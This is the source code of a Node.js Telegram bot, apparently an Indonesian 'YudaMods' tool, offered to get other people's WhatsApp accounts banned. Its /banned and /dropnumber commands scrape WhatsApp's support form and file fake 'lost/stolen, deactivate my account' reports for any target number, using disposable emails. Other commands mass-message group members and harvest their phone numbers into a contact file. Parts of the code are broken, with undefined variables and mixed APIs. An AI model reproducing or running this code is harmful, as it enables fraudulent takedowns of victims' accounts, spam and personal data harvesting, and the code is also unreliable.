const { Telegraf } = require('telegraf');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const util = require('util');

const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');

// URL for Telegram thumbnail
const thumbPath = 'telegra.ph/file/2660b2f3572c0f2571fe9.png'; // Ganti Link Thumb Lu


// YouTube link
const youtubeLink = 'https://youtube.com/@YUDAMODS'; // Ganti Aja Bebas

bot.start((ctx) => ctx.reply('Welcome to the WhatsApp submission bot! Use /menu <view all menu>.'));

bot.use((ctx, next) => {
  console.log(`[${new Date().toLocaleString()}] Received message from ${ctx.from.username}: ${ctx.message.text}`);
  next();
});


function sendStartMenu(chatId) {
  const startMessage = "Selamat datang di bot YudaMods!\n\n" +
    "Berikut adalah fitur yang tersedia:\n" +
    "/banned [62xxxx] - banned whatsapp permanent\n" +
    "/dropnumber - Banned whatsapp sementara\n"; +
    "/pushkontakmenu - Menampilkan menu push";
  
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🎬 Kunjungi YouTube', url: youtubeLink }],
      ],
    },
  };

  bot.sendPhoto(chatId, thumbPath, { caption: startMessage, ...keyboard });
}


bot.on('text', async (ctx) => {
    const message = ctx.message.text;
    const command = message.split(' ')[0];

    switch (command) {
        case '/menu':
      sendStartMenu(chatId);
      break;
        case '/banned':
            const bannedArgs = message.split(' ');
            const bannedPhoneNumber = bannedArgs.length > 1 ? bannedArgs[1] : null;
            if (!bannedPhoneNumber) {
                ctx.reply('Please provide the target phone number.');
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Perdido/roubado: desative minha conta");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        case '/dropnumber':

            const dropArgs = message.split(' ');
            const dropPhoneNumber = dropArgs.length > 1 ? dropArgs[1] : null;
            if (!dropPhoneNumber) {
                ctx.reply('Please provide the target phone number.');
                return;
            }
            const ddi = dropPhoneNumber.substring(0, 2);
            const number = dropPhoneNumber.substring(2);

            try {
                const res = await dropNumber({ phoneNumber: dropPhoneNumber, ddi, number });
                ctx.reply(`Success! System number ${ddi}${number} has been initiated.`);
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        default:
            // Handle unknown commands or do nothing
            break;
    }
});

const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", phoneNumber);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        return true;
    } catch (error) {
        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
    }
};

bot.on('text', async (ctx) => {
    const command = ctx.message.text.toLowerCase();
    switch (command) {
        case '/pushkontakmenu':
    // Create a keyboard with a single button labeled "Lanjutkan"
    const keyboard = {
        reply_markup: {
            keyboard: [
                [{ text: 'Lanjutkan' }]
            ],
            resize_keyboard: true
        }
    };
    
    // Send a message with the prompt and the "Lanjutkan" button
    ctx.reply(`Anda yakin dengan pilihan Anda? Whatsapp Anda dapat diblokir jika baru saja menautkan dengan bot. Silahkan ketik /lanjutkan untuk melanjutkan.`, keyboard);
    break;


        case '/pushkontak':
            const text = ctx.message.text.split(' ').slice(1).join(' ');
            if (!text) return ctx.reply(`Penggunaan Salah. Silahkan gunakan perintah seperti ini\n/pushkontakv3 idgroup|jeda|teks\nUntuk melihat ID Group, ketik /idgroup`);
            ctx.reply("Otw Boskuuu");
            const groupMetadata = await ctx.getChat(text.split("|")[0]).catch(e => {});
            const participants = groupMetadata.participants;
            const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            global.tekspushkonv3 = text.split("|")[2];
            for (let mem of halls) {
                if (/image/.test(mime)) {
                    const media = await ctx.telegram.getFileLink(ctx.message.photo[0].file_id);
                    await ctx.telegram.sendPhoto(mem, { source: media.href, caption: global.tekspushkonv3 });
                    await sleep(text.split("|")[1]);
                } else {
                    await ctx.telegram.sendMessage(mem, global.tekspushkonv3);
                    await sleep(text.split("|")[1]);
                }
            }
            ctx.reply("Success Boss!");
            break;

        case '/savecontact':
            if (!text) return ctx.reply(`Maaf, fitur ini hanya bisa digunakan di dalam grup. Untuk memasukkan bot ke dalam grup yang diinginkan, silakan ketik /join linkgroup.`);
            ctx.reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_");
            const groupMetadata = ctx.chat.type === 'group' ? await ctx.getChat(ctx.message.chat.id) : "";
            const participants = ctx.chat.type === 'group' ? groupMetadata.participants : "";
            const halsss = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            for (let men of halsss) {
                if (isContacts) return;
                contacts.push(men);
                fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts));
            }
            ctx.reply("Sukses, file sudah dikirim melalui pesan pribadi.");
            try {
                const uniqueContacts = [...new Set(contacts)];
                const vcardContent = uniqueContacts.map((contact, index) => {
                    const vcard = [
                        "BEGIN:VCARD",
                        "VERSION:3.0",
                        `FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
                        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                        "END:VCARD",
                        "", ].join("\n");
                    return vcard;
                }).join("");
                fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
            } catch (err) {
                console.error(err);
                ctx.reply("Terjadi kesalahan saat menyimpan kontak.");
            } finally {
                await ctx.replyWithDocument({ source: "./database/contacts.vcf" });
                contacts.splice(0, contacts.length);
                fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts));
            }
            break;

          case '/lanjutkan':
    if (cekUser("id", ctx.message.from.id) == null) return ctx.reply(`Maaf *@${ctx.message.from.username}*, sepertinya kamu belum terdaftar di database. Silahkan daftar terlebih dahulu sebelum menggunakan perintah ini.`);
    if (!isCreator) return ctx.reply('Maaf, perintah ini hanya untuk pemilik.');
    ctx.reply (`Hay Kak ${pushname} 👋 Selamat ${salam}
    Total Pengguna Premium :  ${owner.length}
    Status : ${isCreator ? 'Premium' : 'Free'}
    ▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭

    ⏣ ${prefix}cekidgc
    ⏣ ${prefix}pushkontak idgroup|jeda|teks
    ⏣ ${prefix}savekontak *teks*`)
    break;
    
case '/cekidgc':
    // Get the ID of the current chat
    const chatId = ctx.message.chat.id;
    
    // Send the chat ID as a message to the user
    ctx.reply(`Chat ID: ${chatId}`);
    break;



   
        // Add more command cases here...

        default:
            // Handle invalid commands here
            break;
    }
});

// Start the bot
bot.launch();


console.log('Bot is now running');